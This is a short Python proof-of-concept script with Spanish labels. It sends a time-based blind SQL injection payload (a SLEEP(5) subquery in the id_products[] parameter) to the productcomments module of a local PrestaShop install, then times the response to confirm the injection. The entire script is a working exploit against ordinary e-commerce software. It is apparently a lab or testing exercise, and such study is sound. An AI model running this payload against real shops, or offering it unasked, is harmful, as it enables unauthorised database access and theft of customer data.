import sys
import requests
from datetime import datetime


def funcionPrincipal():
    t1=datetime.now()

    r =  requests.get("http://localhost/prestashop_si/index.php?fc=module&module=productcomments&controller=CommentGrade&id_products[]=1%20AND%20(SELECT%203875%20FROM%20(SELECT(SLEEP(5)))xoOt)")
    print(r.content)
    
    t2=datetime.now()
    duration=t2-t1

    print(round(duration.total_seconds(),2),"segundos demora")

if __name__ == "__main__":
    funcionPrincipal()